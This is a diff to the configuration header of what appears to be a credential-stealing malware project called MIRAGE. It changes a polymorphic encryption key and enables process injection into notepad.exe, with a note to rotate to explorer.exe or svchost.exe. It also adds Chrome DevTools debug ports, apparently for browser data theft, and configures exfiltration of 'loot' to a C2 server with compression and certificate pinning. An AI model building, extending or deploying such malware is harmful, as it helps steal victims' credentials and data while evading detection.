@@ -12,11 +12,11 @@
 
 /* ═══════ Crypto Constants ═══════════════════════════════════════ */
 
-#define MIRAGE_SEED            0x9BC383A3
+#define MIRAGE_SEED            0x7D572BA2
 #define MIRAGE_SSN_XOR_KEY     0xA3B5C7D9
 
 static const unsigned char MIRAGE_STRING_KEY_ENC[16] = {
-    0xdd, 0x05, 0x24, 0xe7, 0x98, 0x46, 0x7c, 0x38, 0x98, 0xd3, 0x76, 0x8d, 0xb4, 0x5e, 0x2b, 0xd2   /* polymorphic */
+    0xef, 0x4c, 0x53, 0xe0, 0x12, 0xf4, 0xfe, 0x51, 0x06, 0x04, 0xd6, 0x98, 0xff, 0x6f, 0x8e, 0xe2   /* polymorphic */
 };
 /* ═══════ Anti-Analysis Thresholds ═══════════════════════════════ */
 
@@ -142,14 +142,34 @@ static const unsigned char MIRAGE_STRING_KEY_ENC[16] = {
 /* ═══════ Process Injection ════════════════════════════════════ */
 
 #define ENABLE_PROCESS_INJECTION
+/*
+ * TODO: randomize INJECT_TARGET per-build via make_polymorphic.py
+ * Current: "notepad.exe" — choose from explorer.exe, svchost.exe, etc.
+ */
 #define INJECT_TARGET    "notepad.exe"
+
+/* ═══════ CDP / Browser Debug Ports ══════════════════════════════ */
+
+#define CDP_PORT_START     9222    /* Chrome DevTools Protocol range */
+#define CDP_PORT_END       9230
 
 /* ═══════ C2 Configuration ═══════════════════════════════════════ */
 
 #define ENABLE_C2_EXFIL             /* Upload loot to C2 panel */
+#define ENABLE_COMPRESSION          /* LZ4 compression for exfil payloads */
 #define C2_HOST                "127.0.0.1"
 #define C2_PORT                9999
 #define C2_TOKEN               "changeme"
+
+/* ═══════ Certificate Pinning ═══════════════════════════════════ */
+/* SHA-256 of server cert SubjectPublicKeyInfo (SPKI pin).
+ * Set via: openssl s_client -connect HOST:443 | openssl x509 -pubkey \
+ *   | openssl pkey -pubout -outform DER | sha256sum
+ * Placeholder until build-time extraction is wired. */
+#define CERT_PIN_HASH \
+    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+#warning "C2_TOKEN is default 'changeme' — set a real token before production"
 
 /* #define ZIALFI_DEBUG */  /* Uncomment to enable debug output */
 
